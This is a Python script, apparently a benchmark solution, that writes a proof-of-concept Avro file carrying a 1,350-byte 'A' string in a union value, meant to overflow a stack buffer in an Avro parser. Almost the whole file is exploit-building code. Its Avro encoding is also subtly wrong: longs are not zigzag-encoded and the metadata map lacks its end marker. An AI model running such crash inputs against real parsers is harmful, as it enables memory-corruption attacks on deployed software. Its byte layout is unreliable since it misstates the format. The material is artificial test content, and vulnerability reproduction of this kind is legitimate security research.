import sys

class Solution:
    @staticmethod
    def _encode_long(n: int) -> bytes:
        if n == 0:
            return b'\x00'
        bs = bytearray()
        while n > 0:
            b = n & 0x7f
            n >>= 7
            if n > 0:
                b |= 0x80
            bs.append(b)
        return bytes(bs)

    @staticmethod
    def _encode_bytes(b: bytes) -> bytes:
        return Solution._encode_long(len(b)) + b

    @staticmethod
    def _encode_string(s: str) -> bytes:
        b = s.encode('utf-8')
        return Solution._encode_bytes(b)

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a stack buffer overflow in an Avro parser.

        The vulnerability is triggered when parsing a union type from binary data.
        The PoC consists of an Avro file with a union schema `["null", "string"]`.
        The data block contains a single object of this type, a string, prefixed
        by its type index (tag). A long string payload overflows the parser's buffer.
        This approach produces a shorter PoC than embedding the payload in the JSON
        schema due to less overhead in the binary format.
        """
        
        # 1. Construct the Avro file header
        schema_json = '["null","string"]'
        schema_bytes = schema_json.encode('utf-8')

        metadata = (
            self._encode_long(2) +  # 2 key-value pairs in the metadata map
            self._encode_string("avro.schema") +
            self._encode_bytes(schema_bytes) +
            self._encode_string("avro.codec") +
            self._encode_bytes(b'null')  # 'null' codec means no compression
        )

        # A 16-byte sync marker for file integrity.
        sync_marker = b'SixteenByteSyncM'

        header = b'Obj\x01' + metadata + sync_marker

        # 2. Construct the data block with the overflow payload
        payload_len = 1350
        payload = b'A' * payload_len

        # A serialized union object: tag + serialized value
        serialized_object = (
            self._encode_long(1) +  # Tag for "string" type (index 1 in the union)
            self._encode_long(len(payload)) +
            payload
        )

        data_block = (
            self._encode_long(1) +  # Number of objects in the block
            self._encode_long(len(serialized_object)) +  # Total size of objects in bytes
            serialized_object +
            sync_marker
        )

        # 3. Assemble the final PoC
        poc = header + data_block
        
        return poc
